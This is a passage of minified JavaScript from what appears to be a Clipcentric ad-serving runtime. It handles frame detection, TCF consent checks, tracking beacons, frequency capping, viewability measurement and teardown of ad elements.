            Bb = self.innerWidth;
            yc = self.innerHeight;
            X.register(q, r, Bf);
            X.supports();
          }
        } catch (t) {
          X = null, Sb = !1;
        }
        M || X || top === self || !u.AMP_CONTEXT_DATA || (Sb = !0);
      }
      if (lb && top !== self && !M) {
        e = X || Sb ? !1 : !0;
        F.nobust && (e = !1);
        F.bust && (e = !0);
        if (e) {
          if (!/(creative-preview-an)/.test(self.location.host)) try {
            if (top.alert) u = top, C = u.document, la = C.body, Va = C.documentElement, Qd = "BackCompat" === C.compatMode, Cf(), Y[0] = Ca = Df(), Y[1] = !0;else throw "x";
          } catch (t) {}
          e = !1;
        }
        if (e) return;
      }
      Bg();
    },
    Bg = function () {
      ef = Sb ? "a" : X ? "s" : M ? "m" : top !== u ? "i" : "w";
      var a;
      if (/^c/.test(F.privacy) && "gdpr" !== Od) Cc = Db = Eb = !0, Da.a = 4, ge(), vd();else {
        try {
          if (top.__tcfapi) {
            top.__tcfapi("addEventListener", 2, he);
            var b = !0;
          }
        } catch (d) {}
        if (!b) {
          for (a = self; a;) {
            try {
              if (a.frames.__tcfapiLocator) {
                var c = a;
                break;
              }
            } catch (d) {}
            if (a === top) break;
            a = a.parent;
          }
          c && (b = !0, self.addEventListener("message", he, !1), a = {
            __tcfapiCall: {
              command: "addEventListener",
              version: 2,
              callId: mc
            }
          }, c.postMessage(a, "*"));
        }
        b || (Cc = !0, Ef(), ge(), vd());
      }
    },
    vd = function () {
      var a, b, c;
      if (Cc) if (Eb) {
        if (!Fb && (1 !== I && (a = M && (!Xa || !kd)), a)) {
          oa("in");
          sf = !0;
          for (b = 0; 5 >= b; b++) ie(b);
          return;
        }
        Fb = !0;
        Dg();
        ee();
        Ub.push([Eg]);
        vf = 0 < (I & 390) && 13 > fb && top !== u;
        qc = je(F.dest);
        Qa = Vb(F.click);
        var d = F.view.concat();
        for (a = 0; a < d.length; a++) if (c = Vb(d[a])) dd.push(c);else {
          a: {
            c = d[a];
            try {
              var e = c;
              c = "string" === typeof e ? e.replace(/^\s+|\s+$/g, "") : "number" === typeof e ? e + "" : "";
              if (/^<(.|\s)+\/\/(.|\s)+>$/.test(c)) {
                b = c;
                break a;
              }
            } catch (g) {}
            b = "";
          }
          b && rc.push(d[a]);
        }
        Qa = Wb(Qa);
        if (Ca) {
          if (lb) {
            Y[1] && (b = Ca.style, Y[2] = b.position, Y[3] = b.opacity, Y[4] = b.zIndex, Y[5] = b.pointerEvents, Y[6] = b.top, Y[7] = b.left, Ca.parentNode !== Ca.offsetParent && (Y[11] = Ca.parentNode.style.position, Ca.parentNode.style.position = "relative"), b.opacity = .001, b.zIndex = -2, b.pointerEvents = "none", b.top = b.left = "0px", b.position = "absolute");
            qb();
            Xd = R;
            Yd = Z;
            0 < (I & 1) ? Ub.push([Ff, Va, !0]) : Q(u, "resize", Xb);
            0 < (I & 390) && ke(R, 0);
            Ec();
            b = Ba && Ba.src.substr(0, 30) || "";
            zf = /gdn/.test(b);
            /ibm/.test(b);
            b = M || Jb || hf || 0 < (I & 390) ? 2 : 4;
            a = F.privacy || F.storage;
            d = F.gdpr;
            Db ? /^(s|c):/.test(a) ? (a = a.split(":"), "0" == a[2] ? ha = 1 : (ha = 0, ha |= /^1/.test(a[2]) ? 2 : b, ha |= /c$/.test(a[2]) ? 8 : 16)) : ha = "0" === a ? 1 : "0p" === d ? 1 : "1p" === d ? 18 : b | 16 : ha = 1;
            zf && 1 !== ha && (ha &= -17, ha |= 8, ha &= -3, ha |= 4);
            1 === ha || ha & 2 ? pc = !0 : ha & 4 && (b = "u=cc1723574&t=" + encodeURIComponent(bd + Yb(!0)), ha & 8 && (b += "&uc=1"), b += "&i=1", Td = !0, Wa = C.createElement("iframe"), Wa.width = Wa.height = "1", Wa.style.cssText = "position:absolute;visibility:hidden;pointer-events:none;width:1px;height:0px;left:0px;margin:0px;padding:0px;border-width:0px", Wa.src = "https://ad.clipcentric.com/user-10/resources/store.phtml?v231030#" + b, Q(Wa, "load", Fg), b = Ca.parentNode, Ub.push([P, b, Wa]));
            le(1);
            Gg();
            fe();
            for (b = 0; 5 >= b; b++) Gf(b);
            a = ba[0];
            try {
              Ha = D[a][0], Hf();
            } catch (g) {}
            oa("in,im,fi");
            If();
            Hg();
            Ig();
          } else oa("in,im,ai"), Ha = Gf(ba[0]), Hf();
          "object" === typeof F && (F._m = Ha, F._m.setAttribute("data-cc-id", 1723574));
        } else oa("er:1");
        Jf();
      } else oa("in,ni");
    },
    Jf = function () {
      if (0 < Ub.length) {
        var a = Ub.shift();
        u.ccAnimate(function (b) {
          return function () {
            Jf();
            if (0 < b.length) b[0].apply(null, b.slice(1));else b[0]();
          };
        }(a));
      }
    },
    Eg = function () {
      if (!yf && (Ja || M)) {
        yf = !0;
        var a = document;
        var b = a.createElement("iframe");
        b.scrolling = "no";
        b.frameBorder = "0";
        var c = b.style;
        c.position = "absolute";
        c.zIndex = -2;
        c.opacity = .001;
        c.top = c.left = "0px";
        c.width = c.height = "100%";
        c.pointerEvents = "none";
        b.src = nc + "ad.html#fid=1723574";
        P(Ba.parentNode, b, Ba.nextSibling);
        for (b = 0; 2 > b; b++) c = (0 === b ? a.documentElement : a.body).style, c.padding = c.margin = "0px", c.width = c.height = "100%";
        c = a.querySelector($a("G.oolgAetcviVeeiEwelemtn"));
        b = a.querySelector($a("G.oolgAetcviVeeiIwnnreoCtniaenr"));
        if (c || b) if (c && (c.style.display = "inline-block", c.style.width = c.style.height = "100%"), "complete" !== a.readyState) try {
          self.dispatchEvent(new Event("load"));
        } catch (d) {}
      }
    },
    wd = function () {
      if (sf && !Fb) {
        Fb = !0;
        Nb = Ea();
        vd();
        var a = B[0];
        var b = ba[0];
        0 < (a[1] & 32) && "canvas" === ab(b) && (Oa(b, !0), Pc(b));
      }
    },
    Jg = function () {
      var a;
      void 0 !== C.hidden ? a = "visibilitychange" : void 0 !== C.msHidden ? a = "msvisibilitychange" : void 0 !== C.webkitHidden && (a = "webkitvisibilitychange");
      return a;
    },
    Ff = function (a, b, c) {
      var d;
      for (d = 0; d < Cb.length; d++) if (Cb[d][0] === a) return;
      var e = Kg;
      d = Lg;
      c && (e = Mg, d = Ng);
      if (!b) try {
        var g = new ResizeObserver(e);
        g.observe(a);
        Cb.push([a, null]);
        sd.push(g);
        return;
      } catch (f) {}
      b = C.createElement("iframe");
      b.scrolling = "no";
      0 < (I & 390) ? (c = "min-", b.width = b.height = 1) : c = "";
      b.style.cssText = c + "height:95%;" + c + "width:95%;top:-100%;left:-100%;margin:0px;padding:0px;border-width:0px;position:absolute;background-color:transparent;z-index:-9999;pointer-events:none";
      P(a, b);
      c = b.contentWindow;
      g = c.document;
      g.open("text/html", "replace");
      g.write("<html><head><style>html,body{height:100%;overflow:hidden}</style></head><body></body></html>");
      g.close();
      Cb.push([a, b]);
      Q(c, "resize", d);
    },
    Kg = function (a, b) {
      sa(pf);
      pf = ma(Xb, 10);
    },
    Lg = function (a) {
      a = a.target;
      var b = a.document.documentElement,
        c = b.clientWidth;
      b = b.clientHeight;
      if (c !== a.ccw || b !== a.cch) a.ccw = c, a.cch = b, Xb();
    },
    me = function (a) {
      if (!Ac && nb) {
        Ac = !0;
        a = Ya;
        var b = Za;
        Ec();
        if (a !== Ya || b !== Za) qb(), Kf();
        sa(jd);
        jd = ma(Lf, 1);
      }
    },
    Mg = function (a, b) {
      sa(rf);
      rf = ma(me, 10);
    },
    Ng = function (a) {
      a = a.target;
      var b = a.document.documentElement,
        c = b.clientWidth;
      b = b.clientHeight;
      if (c !== a.ccw || b !== a.cch) a.ccw = c, a.cch = b, me();
    },
    he = function (a, b) {
      var c = {};
      if (!Cc) {
        if (a.data) try {
          var d = "string" === typeof a.data ? JSON.parse(a.data) : a.data;
          var e = d.__tcfapiReturn || {};
          if (e.callId !== mc) return;
          c = e.returnValue || {};
          var g = e.success;
        } catch (m) {} else b && (c = a, g = b);
        if (g) try {
          if (Da.i = c.cmpId, Da.v = c.cmpVersion, Da.t = c.tcfPolicyVersion, void 0 !== c.gdprApplies) if (Da.a = c.gdprApplies ? 1 : 0, c.gdprApplies) {
            if (/(lo|co)/.test(c.eventStatus)) {
              var f = !0;
              ne(c, 1) && (Db = !0);
              var k = ne(c, 2);
              var h = ne(c, 7);
              k && h && (Eb = !0);
            }
          } else Eb = Db = f = !0;
        } catch (m) {
          f = !0, Da.e = 1, Ef();
        }
        f && (Cc = !0, self.removeEventListener("message", he, !1), ge(), vd());
      }
    },
    ne = function (a, b) {
      var c, d;
      (c = (c = a.publisher && a.publisher.restrictions) && c[b]) && (d = c[319]);
      void 0 === d && (d = "_");
      Da["p" + b] = [d, a.purpose.consents[b] ? 1 : 0, a.vendor.consents[319] ? 1 : 0, a.purpose.legitimateInterests[b] ? 1 : 0, a.vendor.legitimateInterests[319] ? 1 : 0].join("");
      return 0 != d && (a.purpose.consents[b] && a.vendor.consents[319] && 2 != d || a.purpose.legitimateInterests[b] && a.vendor.legitimateInterests[319] && 1 != d) ? !0 : !1;
    },
    Ef = function () {
      var a = F.privacy || F.storage;
      "gdpr" === Od ? (Da.a = 2, /^.:d/.test(a) ? Eb = Db = !1 : (Db = !1, Eb = !0)) : (Da.a = 3, Eb = Db = !0);
    },
    ge = function () {
      var a = [];
      Da.r = Od || "n";
      for (b in Da) Da.hasOwnProperty(b) && a.push(b + ":" + Da[b]);
      a.sort();
      var b = "https://tr.clipcentric.com/s/" + bd + Yb() + "/TCF=" + a.join(",") + "/E=tcf";
      oc ? navigator.sendBeacon(b, "") : (a = new Image(), a.src = b);
    },
    Fg = function (a) {
      if (!pc && (pc = !0, pc)) {
        for (a = 0; a < Dc.length; a++) {
          var b = Dc[a];
          2 === b[0] && le(b[1], b[2]);
        }
        Dc = [];
      }
    },
    le = function (a, b) {
      var c,
        d = [];
      if (pc) {
        if (1 === a) {
          if (Td) return;
          Td = !0;
          var e = bd;
        }
        if (2 === a) {
          if (Mf[b]) return;
          Mf[b] = !0;
          e = xd[b];
        }
        if (ha & 2) {
          var g = Math.round(Ea() / 1E3);
          b = {
            i: mc,
            u: Ta,
            d: kb
          };
          e += Yb(!0);
          var f = e.split("/");
          for (c = 0; c < f.length; c++) {
            var k = f[c].split("=", 2);
            b[k[0].toLowerCase()] = k[1];
          }
          if (b.f) {
            k = "f c p a l v fc fp fl fr cp cl pa pl pv al av lv".split(" ");
            f = jg("cc-f") || {};
            var h = [];
            for (p in f) {
              var m = f[p];
              c = g - m[0];
              7776E3 < c ? delete f[p] : (c = m[1], h.push(c));
            }
            for (c = 0; c < k.length; c++) {
              var l = k[c];
              var n = l.length;
              var q = [];
              var r = !0;
              for (m = 0; m < n; m++) {
                var t = l.substr(m, 1);
                if (b[t]) q.push(t + b[t]);else {
                  r = !1;
                  break;
                }
              }
              if (r) {
                var p = q.join(".");
                if (p in f) {
                  if (m = f[p], 2 !== a || 0 <= l.indexOf("f")) m[1] = g, m[2]++;
                } else f[p] = m = [], m[0] = g, m[1] = g, m[2] = 1;
                d.push(l + "." + m[2]);
              }
            }
            if (50 < h.length) for (p in h.sort(function (y, w) {
              return y - w;
            }), c = h[50], f) m = f[p], m[1] >= c && delete f[p];
            kg("cc-f", f);
            0 < d.length && (a = "https://tr.clipcentric.com/s/" + e + "/Q=" + d.join("_") + "/E=fq", e = new Image(), e.src = a);
          }
        } else if (ha & 4) try {
          1 === a && (g = "i", Wa.contentWindow.postMessage(g, "*")), 2 === a && (g = "v:" + xd[b] + Yb(), Wa.contentWindow.postMessage(g, "*"));
        } catch (y) {}
      } else Dc.push([2, a, b]);
    },
    Hf = function () {
      var a;
      var b = Ca.parentNode;
      "HEAD" === b.nodeName ? b = la : a = Ca.nextSibling;
      if (b && Ha) {
        if (M) {
          var c = Ha.style;
          c.marginLeft = "calc(50vw - " + parseInt(c.width) / 2 + "px)";
        }
        P(b, Ha, a);
        Ub.push([Ff, b, !1, !0]);
      }
    },
    Df = function (a, b) {
      var c, d, e;
      if (!a) {
        try {
          if (self.frameElement.ownerDocument.defaultView === top) return self.frameElement;
        } catch (k) {}
        a = top;
      }
      var g = a.frames;
      for (c = 0; c < g.length; c++) {
        if (a === top) {
          b = null;
          try {
            g[c].frameElement && (b = g[c].frameElement);
          } catch (k) {}
          if (!b) try {
            var f = top.document.getElementsByTagName("IFRAME");
            for (d = 0; d < f.length; d++) if (f[d].contentWindow === g[c]) {
              b = f[d];
              break;
            }
          } catch (k) {}
        }
        try {
          if (g[c] === self) return b;
        } catch (k) {}
        try {
          if (e = Df(g[c], b)) return e;
        } catch (k) {}
      }
    },
    ie = function (a, b) {
      var c = B[a];
      0 < (c[1] & 34) || (c[1] |= 2, c[3] = b, b = ab(a), 2 === a || 3 === a ? De(a, wa[a][9], !0) : "canvas" === b ? og(a) : c[2] || fc(a));
    },
    oe = !1,
    De = function (a, b, c, d) {
      var e = new Image();
      b = bb(b);
      var g = B[a];
      c && (c = g[2], g[2] = c ? c + 1 : 1);
      d && (e.crossOrigin = "anonymous");
      e.onload = e.onerror = function () {
        oe = !0;
        var f = e.lid,
          k = B[f];
        e.onload = e.onerror = null;
        k[2]--;
        0 === k[2] && fc(f);
        oe = !1;
      };
      e.lid = a;
      e.src = b;
      return e;
    },
    fc = function (a) {
      var b = B[a],
        c = b[1],
        d = ba[a];
      b[1] = 32;
      if (b[3]) b[3](a);
      Fb && (0 === a && "canvas" === ab(d) && (Oa(d, !0), Pc(d)), 0 < (c & 4) && cb(d, 2, 0 < (c & 8)));
    },
    Vb = function (a) {
      try {
        if (/^(https?|data):/i.test(a)) return a;
      } catch (b) {}
      return "";
    },
    je = function (a) {
      try {
        if (/^\w+:\/\//.test(a)) return a;
      } catch (b) {}
      return "";
    },
    Wb = function (a) {
      try {
        a = a.replace(/(%%CACHEBUSTER%%|\[timestamp\])/ig, Ea()), a = a.replace(/%%([\w:]*?)%%/g, function (b, c) {
          return Zb(c);
        }), a = a.replace(/%25%25([\w:]*?)%25%25/g, function (b, c) {
          return Zb(c);
        }), a = a.replace(/%(\w*?)(!|%21)/g, function (b, c) {
          return Zb(c);
        }), a = a.replace(/\[\[\[(\w*?)\]\]\]/g, function (b, c) {
          return Zb(c);
        }), a = a.replace(/%5b%5b%5b(\w*?)%5d%5d%5d/ig, function (b, c) {
          return Zb(c);
        }), a = a.replace(/\[(sas_\w*?)\]/ig, function (b, c) {
          return Zb(c);
        }), a = a.replace(/\[PAGEURL\]/g, encodeURIComponent("https://" + Ta)), a = a.replace(/%%/g, "%25%25");
      } catch (b) {}
      return a;
    },
    Zb = function (a) {
      "PATTERN:url" === a ? a = "host" : a && (a = a.replace(/^PATTERN:/, ""));
      return F[a] && !/^%/.test(F[a]) ? encodeURIComponent(F[a]) : "";
    },
    Nf = function (a) {
      var b;
      lb = !0;
      la = C.body;
      Va = C.documentElement;
      !la && 5E3 > a ? ma(Nf, 1, a + 1) : (Cf(), fb = 0 < (ua & 390) && (b = na.match(/OS ([\d|_]+)/)) ? parseFloat(b[1].replace("_", ".")) : 0, kf = hf && (b = na.match(/Version\/(\d+)/)) ? parseInt(b[1]) : 0, 0 < (ua & 6) && 0 === fb && (fb = kf), Sd = Ze && (b = na.match(/\b(Chrome|CriOS)\/(\d+)/i)) ? parseInt(b[2]) : 0, Cd = Jb && (b = na.match(/\bFirefox\/(\d+)/i)) ? parseInt(b[1]) : 0, La = u.devicePixelRatio || 1, 2 < La && (La /= 2), Ee || 0 < (ua & 1560) && Jb && 25 > Cd ? lb = !1 : (Rd = RegExp("Android.+Firefox", "i").test(na), zb = 1 === I || 0 < (I & 390) && 10 <= fb || 0 < (I & 1560) && (53 <= Sd || Jb), u.CanvasRenderingContext2D || (lb = !1)), Cg());
    },
    Cf = function () {
      var a;
      jf = (a = (screen.orientation || {}).type || screen.mozOrientation) && 0 === (I & 390) ? /land/.test(a) ? 2 : 1 : void 0 !== u.orientation ? 90 == Math.abs(u.orientation) ? 2 : 1 : 2;
      a = /android/i.test(na);
      var b = /ip(hone|od|ad)/i.test(na);
      var c = 2 === jf;
      /\bsilk\b/i.test(na) ? (a = !0, ua = c ? 8 : 16, kb = "t") : /(android|bb\d+|meego).+ mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(na) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(na.substr(0, 4)) ? (ua = a ? c ? 512 : 1024 : b ? c ? 128 : 256 : c ? 2048 : 4096, kb = "p") : /android|ipad|playbook/i.test(na) ? (ua = a ? c ? 8 : 16 : b ? c ? 2 : 4 : c ? 32 : 64, kb = "t") : "MacIntel" === navigator.platform && 1 < navigator.maxTouchPoints ? (b = !0, ua = c ? 2 : 4, kb = "t") : (ua = 1, kb = "d");
      1 !== ua && (kb += (a ? "a" : b ? "i" : "o") + (c ? "l" : "p"));
      I = ua;
    },
    Dg = function () {
      var a;
      u.ccAnimate || (u.ccAnimate = u.requestAnimationFrame, u.ccCancel = u.cancelAnimationFrame || u.cancelRequestAnimationFrame);
      if (!u.ccAnimate) {
        var b = ["ms", "moz", "webkit", "o"];
        for (a = 0; a < b.length && !u.ccAnimate; a++) u.ccAnimate = u[b[a] + "RequestAnimationFrame"], u.ccCancel = u[b[a] + "CancelAnimationFrame"] || u[b[a] + "CancelRequestAnimationFrame"];
      }
      if (!u.ccAnimate) {
        var c = 0;
        u.ccAnimate = function (d, e) {
          var g = new Date().getTime(),
            f = Math.max(0, 16 - (g - c));
          e = u.setTimeout(function () {
            d(g + f);
          }, f);
          c = g + f;
          return e;
        };
      }
      u.ccCancel || (u.ccCancel = function (d) {
        sa(d);
      });
      Ib = u.performance && u.performance.now ? u.performance : {
        now: function () {
          return Date.now();
        }
      };
    },
    Gg = function () {
      Q(self, "unload", pe);
      u.Turbolinks && Q(C, "turbolinks:before-render", pe);
      be = Nb;
      of = setInterval(If, 100);
      var a = Jg();
      Q(C, a, Og);
      if (self.ReportingObserver) try {
        Bc = new ReportingObserver(function (b, c) {
          Of(b);
        }, {
          types: ["intervention"],
          buffered: !0
        }), Bc.observe();
      } catch (b) {}
    },
    If = function () {
      var a = ba[0];
      var b = D[a][0];
      a = B[a];
      var c = a[5] * a[6];
      a = -1;
      if (X) a = X.inViewPercentage() / 100;else if (Qb || "expanded" === M) a = 1;else if (M) {
        var d = Pf();
        c = Qf();
        var e = Math.min(d.x + d.width, c.width) - Math.max(d.x, 0);
        var g = Math.min(d.y + d.height, c.height) - Math.max(d.y, 0);
        c = d.width * d.height;
      } else {
        g = u;
        try {
          top.alert && (g = top);
        } catch (t) {}
        e = g.innerWidth;
        g = g.innerHeight;
        var f, k;
        var h = b.ownerDocument.defaultView;
        b = b.getBoundingClientRect();
        if (X || M || top !== h) {
          try {
            d = {};
            for (f in b) d[f] = b[f];
            b = d;
          } catch (t) {}
          b.origLeft = b.left;
          b.origTop = b.top;
        }
        try {
          if (M && !Qb) {
            d = Pf();
            var m = d.x;
            var l = d.y;
          } else if (X) {
            var n = Fc();
            m = n.self.l;
            l = n.self.t;
          } else if (top !== h) for (m = l = 0, k = h; k !== top;) try {
            d = k.frameElement.getBoundingClientRect(), m += d.left, l += d.top, k = k.parent;
          } catch (t) {
            break;
          }
          m && (b.left += m, b.right += m);
          l && (b.top += l, b.bottom += l);
        } catch (t) {}
        d = b;
        e = Math.min(d.right, e) - Math.max(d.left, 0);
        g = Math.min(d.bottom, g) - Math.max(d.top, 0);
      }
      0 > a && e && 0 < c && (a = e * g / c);
      d = Ea();
      try {
        var q = 242500 <= c;
      } catch (t) {
        q = !1;
      }
      Math.max(a, 0) >= (q ? .3 : .5) ? !wf && 1E3 <= d - be && (wf = !0, oa("wi")) : be = d;
      q = ea[1];
      !q[22] && .5 <= a && !q[0] && (q[22] = !0, cb(1, 2));
      q = ea[2];
      !q[22] && .5 <= a && !q[0] && (q[22] = !0, cb(2, 2));
      try {
        var r = Ba.ownerDocument;
        if (r.contains) {
          if (r.body && r.body.contains(Ba) || r.head && r.head.contains(Ba)) return;
        } else if (Ba.parentNode) return;
      } catch (t) {
        return;
      }
      pe();
    },
    pe = function () {
      var a,
        b,
        c,
        d = [],
        e,
        g = [],
        f = [],
        k;
      nb = !1;
      if (!Af) {
        Af = !0;
        try {
          if (Y[1]) {
            var h = Y[0].style;
            h.position = Y[2];
            h.opacity = Y[3];
            h.zIndex = Y[4];
            h.pointerEvents = Y[5];
            h.top = Y[6];
            h.left = Y[7];
            void 0 !== Y[11] && (Y[0].parentNode.style.position = Y[11]);
          }
        } catch (S) {}
        for (h = 0; h < Cb.length; h++) db(Cb[h][1]);
        for (h = 0; h < sd.length; h++) try {
          sd[h].disconnect();
        } catch (S) {}
        Cb = [];
        sd = [];
        if (Bc) try {
          Of(Bc.takeRecords()), Bc.disconnect();
        } catch (S) {}
        wg();
        for (h = 1; 5 >= h; h++) try {
          Ka(h, 2);
        } catch (S) {}
        try {
          for (h = a = c = 0; h < gd.length && a < fd.length; h++) {
            var m = gd[h][0];
            var l = gd[h][1];
            var n = fd[a][0];
            var q = fd[a][1];
            m < n || (g[q] || (g[q] = []), g[q].push(n), f[l] || (f[l] = []), f[l].push(m), c += m - n, a++);
          }
          d.push("si");
          if (1 === I) for (d.push("dt:" + c), e = 0; e < g.length; e++) {
            var r = g[e];
            var t = f[e];
            if (r && t) {
              for (h = a = c = 0; h < t.length && a < r.length; h++) m = t[h], n = r[a], m < n || (c += m - n, a++);
              0 < c && (d.push("la:ldt:" + yb[e] + ":" + c), n = r[0], m = t[t.length - 1], d.push("la:ldr:" + yb[e] + ":" + (m - n)));
            }
          }
          for (b in jb) if (jb.hasOwnProperty(b) && !mf.test(b)) {
            var p = ":" + jb[b];
            0 !== b.indexOf("ld") && (p += ":" + Pd[b]);
            0 !== b.indexOf("ls") && d.push(b + p + "." + za[b]);
          }
          oa(d.join(","));
          var y = [["hm", hd], ["hc", Wd]];
          for (h = 0; 2 > h; h++) {
            var w = y[h][0];
            var v = y[h][1];
            var z = [];
            for (e = 0; e < v.length; e++) if ((k = v[e]) && 0 < k.length) {
              var ca = [];
              for (a = 0; a < k.length; a += 2) ca.push(k[a].toString(16) + "_" + k[a + 1].toString(16));
              for (; 0 < ca.length;) {
                var A = wa[e];
                z.push(A[0] + ":" + A[3] + ":" + A[4] + ":" + ca.splice(0, 10).join("_"));
              }
            }
            for (; 0 < z.length;) oa(w + ":" + z.splice(0, 15).join(":"));
          }
        } catch (S) {}
        clearInterval(of);
        a = B[1];
        clearInterval(a[32]);
        clearInterval(a[26]);
        for (h = 0; h < ob.length; h++) try {
          p = ob[h], $b(p[0], p[1], p[2], p[3]);
        } catch (S) {}
        ob = [];
        de = [];
        db(lf);
        db(void 0);
        db(void 0);
        for (h = 0; h < qd.length; h++) Pg(qd[h][0], qd[h][1]);
        qd = [];
        Rf(2);
        xf = [];
        var E = function (S) {
          var V;
          try {
            var J = S.childNodes;
            var N = J.length;
            for (V = N - 1; 0 <= V; V--) E(J[V]);
          } catch (ka) {}
          try {
            db(S);
          } catch (ka) {}
        };
        for (h = 0; 5 >= h; h++) D[h] && E(D[h][0]);
        pb && (db(pb), pb = null);
        for (h = 0; h < Ud.length; h++) try {
          delete u[Ud[h]];
        } catch (S) {}
        Ud = [];
        D = [];
        Dc = [];
        Ha = null;
      }
    },
    Of = function (a) {
      var b, c;
      for (b = 0; b < a.length; b++) (c = a[b] && a[b].body) && "HeavyAdIntervention" === c.id && oa("hi");
    },
    Og = function () {
      if (nf = C.hidden || C.msHidden || C.webkitHidden) {
        if (!Ob) {
          Ob = !0;
          var a = Date.now();
          for (c in Ia) if (Ia.hasOwnProperty(c)) {
            var b = Ia[c];
            b.paused || (u.clearTimeout(c), b.remaining -= a - b.start, b.paused = !0);
          }
          id = !0;
          qe(!0);
          Md(!0);
        }
      } else if (Ob && !nf) {
        id = Ob = !1;
        for (a in Ia) if (Ia.hasOwnProperty(a)) {
          var c = Ia[a];
          c.paused && (c.args[1] = c.remaining, delete Ia[a], delete sc[c.index], Qg.apply(null, c.args));
        }
        qe(!1);
        Md(!1);
      }
    },
    ma = function () {
      var a = arguments,
        b = a[0],
        c = a[1],
        d = [],
        e;
      for (e = 2; e < a.length; e++) d.push(a[e]);
      return u.setTimeout(function () {
        b.apply(null, d);
      }, c);
    },
    sa = function (a) {
      u.clearTimeout(a);
      Ia[a] && (delete sc[Ia[a].index], delete Ia[a]);
    },
    Qg = function () {
      var a = arguments,
        b = a[0],
        c = a[1],
        d = [],
        e;
      for (e = 2; e < a.length; e++) d.push(a[e]);
      b = function (g, f, k) {
        return function () {
          delete Ia[sc[g] || 0];
          delete sc[g];
          f.apply(null, k);
        };
      }(tc, b, d);
      b = id ? "t" + tc : u.setTimeout(b, c);
      Ia[b] = {
        args: a,
        start: Date.now(),
        remaining: c,
        index: tc,
        paused: id
      };
      sc[tc] = b;
      tc++;
      return b;
    },
    P = function (a, b, c) {
      a.insertBefore(b, c || null);
    },
    db = function (a) {
      a && a.parentNode && a.parentNode.removeChild(a);
    },
    yd = function (a, b, c) {
      if (a = a && a.style) void 0 !== c && (a.MozTransformOrigin = a.WebkitTransformOrigin = a.KhtmlTransformOrigin = a.OTransformOrigin = a["-ms-transform-origin"] = a.transformOrigin = c), a.MozTransform = a.WebkitTransform = a.KhtmlTransform = a.OTransform = a["-ms-transform"] = a.transform = b;
    },
    Ea = function () {
      return new Date().getTime();
    },
    $a = function (a) {
      var b,
        c = [];
      var d = a.length;
      var e = d % 2;
      d -= e;
      for (b = 0; b < d; b += 2) c.push(a.substr(b + 1, 1), a.substr(b, 1));
      0 < e && c.push(a.substr(d, 1));
      return c.join("");
    },
    Mc = function (a) {
      var b;
      (b = a.touches) && b.length ? a = b[0] : (b = a.changedTouches) && b.length && (a = b[0]);
      return {
        x: a.clientX,
        y: a.clientY,
        e: a
      };
    },
    ab = function (a) {
      return (a = wa[a]) ? a[8] : null;
    },
    fe = function () {
      var a;
      for (a = 0; 5 >= a; a++) ba[a] = a;
    },
    zg = function () {
      rd = !1;
      try {
        var a = Object.defineProperty({}, "passive", {
          get: function () {
            rd = !0;
          }
        });
        u.addEventListener("_tp", null, a);
        u.removeEventListener("_tp", null, a);
      } catch (b) {}
    },
    Q = function (a, b, c, d) {
      if (a) try {
        0 !== b.indexOf("swipe") && (rd ? d || (d = !1) : d = d && d.capture ? !0 : !1, a.addEventListener(b, c, d), ob.push([a, b, c, d]));
      } catch (e) {}
    },
    Aa = function (a, b, c, d) {
      var e;
      RegExp("(mousedown|mouseover|mouseenter)", "i").test(b) ? e = "touchstart" : RegExp("(mouseup|mouseout|mouseleave|click)", "i").test(b) ? e = "touchend" : RegExp("(mousemove)", "i").test(b) && (e = "touchmove");
      if (e) {
        var g = function (k) {
          dc || c(k);
        };
        if ("click" === b) {
          Q(a, "touchstart", Ce, d);
